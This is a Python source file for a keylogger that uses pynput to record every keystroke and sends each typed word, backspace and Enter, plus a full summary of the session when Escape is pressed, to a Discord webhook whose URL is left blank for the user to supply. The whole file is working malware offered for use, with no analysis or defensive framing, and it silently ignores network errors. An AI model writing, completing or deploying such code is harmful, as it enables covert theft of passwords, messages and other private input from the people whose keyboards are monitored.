from pynput import keyboard
import requests
import json
import threading

DISCORD_WEBHOOK_URL = "" #Your webhook url

class DiscordKeyLogger:
    def __init__(self):
        self.buffer = ""
        self.buffer_lock = threading.Lock()
        self.current_word = ""
        
    def send_to_discord(self, message):
        if not message.strip():
            return
            
        payload = {
            "content": f"`{message}`",
            "username": "Keylogger PYTHON"
        }
        
        try:
            response = requests.post(
                DISCORD_WEBHOOK_URL,
                data=json.dumps(payload),
                headers={"Content-Type": "application/json"},
                timeout=5
            )
        except Exception:
            pass

    def on_press(self, key):
        try:
            with self.buffer_lock:
                char = key.char
                self.buffer += char
                self.current_word += char
                
        except AttributeError:
            with self.buffer_lock:
                if key == keyboard.Key.space:
                    self.buffer += " "
                    if self.current_word.strip():
                        threading.Thread(target=self.send_to_discord, args=(self.current_word,), daemon=True).start()
                    self.current_word = ""
                    
                elif key == keyboard.Key.enter:
                    self.buffer += "\n"
                    if self.current_word.strip():
                        threading.Thread(target=self.send_to_discord, args=(self.current_word + " ↵"), daemon=True).start()
                    else:
                        threading.Thread(target=self.send_to_discord, args=("↵",), daemon=True).start()
                    self.current_word = ""
                    
                elif key == keyboard.Key.backspace:
                    if len(self.buffer) > 0:
                        self.buffer = self.buffer[:-1]
                    if len(self.current_word) > 0:
                        self.current_word = self.current_word[:-1]
                    threading.Thread(target=self.send_to_discord, args=("⌫",), daemon=True).start()

    def on_release(self, key):
        if key == keyboard.Key.esc:
            with self.buffer_lock:
                if self.current_word.strip():
                    threading.Thread(target=self.send_to_discord, args=(self.current_word + " ⏹️",), daemon=True).start()
                
                if self.buffer.strip():
                    summary = f"\n**📝 COMPLTE SUMMARY:**\n{self.buffer}"
                    threading.Thread(target=self.send_to_discord, args=(summary,), daemon=True).start()
            
            return False

discord_logger = DiscordKeyLogger()

with keyboard.Listener(
    on_press=discord_logger.on_press,
    on_release=discord_logger.on_release
) as listener:
    listener.join()